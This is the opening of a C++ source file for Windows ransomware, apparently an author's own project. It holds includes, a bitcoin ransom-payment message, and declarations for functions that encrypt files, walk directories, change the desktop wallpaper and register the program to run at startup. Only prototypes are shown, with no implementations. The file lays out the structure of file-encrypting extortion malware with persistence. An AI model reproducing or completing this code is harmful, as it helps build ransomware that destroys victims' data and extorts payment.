#define VC_EXTRALEAN
#define _CRT_SECURE_NO_WARNINGS

#ifdef UNICODE
	#undef UNICODE
#endif

#include <iostream>
#include <fstream>
#include <time.h>
#include <string>
#include <windows.h>
#include <shellapi.h>
#include <thread>
#include <wininet.h>
#include <comdef.h>
#include <shlobj.h>

#include "wallpaper.hpp"

#define PaymentInstructions "send money to [le bitcoin address]."

FILE* OUTPUT_FILE;

#define debug
#define CheckExtension

extern "C" int RandomGenerator();
void CryptFile(std::string Path);
void TraverseDir(std::string Path);
bool find(const std::string& myString, const std::string& subString);
static wchar_t* charToWChar(const char* text);
void  SetWallpaper(LPCWSTR file);
BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args);


//global vars

